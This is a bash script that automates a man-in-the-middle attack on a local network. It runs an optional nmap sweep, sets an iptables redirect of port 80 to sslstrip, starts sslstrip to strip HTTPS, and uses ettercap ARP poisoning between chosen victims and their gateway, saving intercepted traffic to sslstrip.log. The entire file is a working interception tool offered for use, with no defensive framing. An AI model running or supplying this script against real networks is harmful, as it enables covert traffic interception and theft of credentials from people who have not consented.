#!/bin/bash

###########################################################################################################
#                             				                                                  #
# mitm uses ettercap and sslstrip to perform APR and intercept HTTPS connections                          #
#                                                                                                         #
##########################################################################################################

#stop error when opening xterm
unset SESSION_MANAGER

#give option for type of attack
clear;while [[ 1 ]]
	do
		echo "1. Single host attack"
		echo "2. Mupltiple host attack"
		echo -e "\n";read -r -p "Please Choose an option: " op
		
		if [[ $op = 1 || $op = 2 ]]
		then
			break
		else
			clear;echo -e "Invalid Input!\n"
		fi
done

############################################################################################################
##give user the option to scan for targets using nmap

clear;read -r -p "Do you need to scan for targets? [Y/N]: " ans

case $ans in
	y* | Y*)while  [[ 1 ]]
		do
			echo -e "\n";read -r -p "Input range to scan (ex. 192.168.1.0/24): " range

			if [[  $range =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\/[0-9]{1,2}$ ]]
			then
				break
			else
				clear;echo -e "Invalid Input!\n"
			fi
		done			

		nmap -sP $range
		;;

	*) clear;echo -e "\nNo targets scanned"
esac

###########################################################################################################
##user input target ip for single attack, or taget range for multiple host attack

case $op in
	1)while [[ 1 ]]
	do
		echo -e "\n";read -r -p "Choose a target IP: " tar

	if [[ $tar =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]
	then
		break
	else
		clear;echo -e "Invalid Input!\n"
	fi	
	
	done
	;;	

	2)while [[ 1 ]]
	do
		echo -e "\n";read -r -p "Choose a target range (ex. 192.168.1.5-10): " tar
	
	if [[ $tar =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\-[0-9]{1,3}$ ]]
	then
		break
	else
		clear;echo -e "Invalid Input!\n"
	fi

	done
esac

#########################################################################################################
##store the target's gateway

while [[ 1 ]]
do
	echo -e "\n";read -r -p "Input gateway's IP: " gw

	if [[ $gw =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]
	then
		break
	else
		clear;echo -e "Invalid Input!\n"
	fi
done

########################################################################################################
##ask for interface to perform attack with

while [[ 1 ]]
do
	echo -e "\n";read -r -p "What interface will be used? (ex. wlan0): " int

if [[ $int =~ ^[a-zA-Z]{3,4}[0-9]{1,2}$ ]]
then
	break
else
	clear;echo -e "Invalid input!\n"
fi

done

#######################################################################################################
##store an unused port for sslstrip

while [[ 1 ]]
do
	echo -e "\n";read -r -p "Choose an unused port for sslstrip to listen on: " port

if [[ $port =~ ^[0-9]{1,4}$ ]]
then
	break
else
	clear;echo -e "Invalid input!\n"
fi

done

clear

######################################################################################################
##Input variables for the attack

#set iptables to forward http traffic to the chosen sslstrip port
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port $port

#open terminals for ettercap and sslstrip with inputted variables
xterm -geometry 80x20-0+0 -e "sslstrip -l $port" &

xterm -geometry 80x20-0-0 -e "ettercap -T -q -i $int -M arp:oneway /$tar/ /$gw/"&

#print the directory where sslstrip.log will be saved
echo -e "\nsslstrip.log will be saved in: `pwd`"

#####################################################################################################
##Clean up and end script

#wait for user input to start ending script
echo -e "\n";read -r -p "Press enter to quit: " quit

killall xterm

#removes the iptables rule set earlier
iptables -t nat -D PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port $port

clear

exit 0

